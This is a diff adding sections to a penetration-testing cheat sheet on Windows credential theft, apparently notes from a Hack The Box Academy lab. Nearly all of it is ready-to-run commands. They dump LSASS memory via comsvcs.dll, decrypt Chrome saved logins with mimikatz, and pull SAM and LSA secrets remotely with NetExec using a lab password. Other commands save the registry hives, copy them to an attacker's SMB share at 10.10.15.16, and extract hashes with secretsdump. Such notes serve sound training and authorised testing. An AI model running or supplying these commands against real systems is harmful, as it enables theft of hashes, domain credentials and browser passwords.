@@ -242,3 +242,113 @@ mimikatz # sekurlsa::dpapi
 ```
 
 * See blog post&#x20;
+
+## LSASS Dump Methods
+
+### Task Manager
+* Open Task Manager → Details tab → right-click `lsass.exe` → Create dump file
+* Output: `%temp%\lsass.DMP`
+
+### Find LSASS PID
+
+```
+tasklist /svc | findstr lsass
+```
+
+```powershell
+Get-Process lsass
+```
+
+### Dump via comsvcs.dll (rundll32)
+
+```powershell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+Replace `672` with the actual LSASS PID.
+
+## Pypykatz (Offline LSASS Parsing)
+
+* Parse LSASS dump on Linux without Mimikatz
+
+```
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+```
+
+Extracts: MSV (NT/SHA1 hashes), WDIGEST (cleartext on older systems), Kerberos tickets, DPAPI masterkeys.
+
+## DPAPI Chrome Credential Decryption
+
+```
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+## Remote SAM Dump (NetExec)
+
+```
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+
+## Remote LSA Secrets Dump (NetExec)
+
+```
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+
+## Windows Credential Manager
+
+### Credential Storage Paths
+* `%UserProfile%\AppData\Local\Microsoft\Vault\`
+* `%UserProfile%\AppData\Local\Microsoft\Credentials\`
+* `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
+* `%ProgramData%\Microsoft\Vault\`
+
+### Export Vault
+
+```
+rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+### Enumerate Saved Credentials
+
+```
+cmdkey /list
+```
+
+### Impersonate with Saved Credentials
+
+```
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+> `sekurlsa::credman` and `vault::cred` extraction covered in [Credential Manager and Vault](#credential-manager-and-vault) above.
+
+## SAM / SYSTEM / SECURITY Hive Extraction
+
+### Copy Registry Hives
+
+```
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+```
+
+Hive purposes: SAM = password hashes, SYSTEM = boot key to decrypt SAM, SECURITY = cached domain creds + DPAPI keys.
+
+### Transfer via Impacket SMB Server
+
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+```
+
+```
+move sam.save \\10.10.15.16\CompData
+move security.save \\10.10.15.16\CompData
+move system.save \\10.10.15.16\CompData
+```
+
+### Dump Hashes with secretsdump
+
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
